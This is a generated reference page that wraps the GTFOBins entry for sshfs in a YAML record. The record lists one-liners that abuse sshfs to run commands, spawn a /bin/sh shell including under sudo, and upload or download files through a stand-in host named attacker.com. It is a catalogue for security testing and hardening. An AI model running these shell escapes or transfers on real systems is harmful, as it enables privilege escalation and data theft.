---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# sshfs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `sshfs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshfs` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [sshfs](../../tools/linux/sshfs.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | sshfs |
| name | sshfs |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/sshfs/ |

## Preserved Source Material

```yaml
_body: ''
_name: sshfs
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sshfs
functions:
  command:
  - blind: true
    code: 'sshfs -o ssh_command=/path/to/command x: /path/to/dir/'
    contexts:
      sudo: null
      unprivileged: null
  download:
  - code: 'sshfs user@attacker.com:/ /path/to/dir/

      cp /path/to/dir/path/to/input-file /path/to/output-file'
    contexts:
      unprivileged: null
    sender: ssh-server
  shell:
  - code: 'echo -e ''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'' >/path/to/temp-file

      chmod +x /path/to/temp-file

      sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/'
    comment: The mount dir must be writable by the invoking user.
    contexts:
      sudo: null
      unprivileged: null
  upload:
  - code: 'sshfs user@attacker.com:/ /path/to/dir/

      cp /path/to/input-file /path/to/dir/'
    contexts:
      unprivileged: null
    receiver: ssh-server
```
